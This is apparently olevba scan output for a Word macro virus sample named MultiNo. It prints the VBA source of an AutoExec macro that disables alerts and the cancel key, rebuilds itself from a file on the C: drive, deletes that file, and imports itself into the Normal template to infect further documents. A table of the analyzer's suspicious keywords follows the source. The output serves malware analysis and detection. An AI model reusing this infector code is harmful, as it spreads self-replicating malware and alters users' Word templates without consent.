olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.MultiNo-494d85b6a2edbed847a3b43d6e115c5ac00623d6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.MultiNo-494d85b6a2edbed847a3b43d6e115c5ac00623d6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iMultiNO.bas 
in file: Virus.MSWord.Intended.MultiNo-494d85b6a2edbed847a3b43d6e115c5ac00623d6 - OLE stream: 'Macros/VBA/iMultiNO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error GoTo E
Application.DisplayAlerts = False
Application.EnableCancelKey = wdDisabled
On Error GoTo make
Open "c:\logov.sys" For Input As #1
Close 1
GoTo imprt
make:
On Error GoTo E
Open "c:\logoz.sys" For Input As #1
Open "c:\logov.sys" For Output As #2
Do
Line Input #1, a$
If Mid$(a$, 5, 1) = ":" Then a$ = "Print #1, " + Chr$(34) + "e" + Mid$(a$, 6, 29) + " " + Mid$(a$, 36, 23) + Chr$(34)
Print #2, a$
Loop Until EOF(1)
Close
Kill "c:\logoz.sys"
imprt:
n = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To n
If NormalTemplate.VBProject.VBComponents(i).Name = "MultiNO" Then GoTo E
Next i
NormalTemplate.VBProject.VBComponents.Import ("c:\logov.sys")
NormalTemplate.Save
E:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

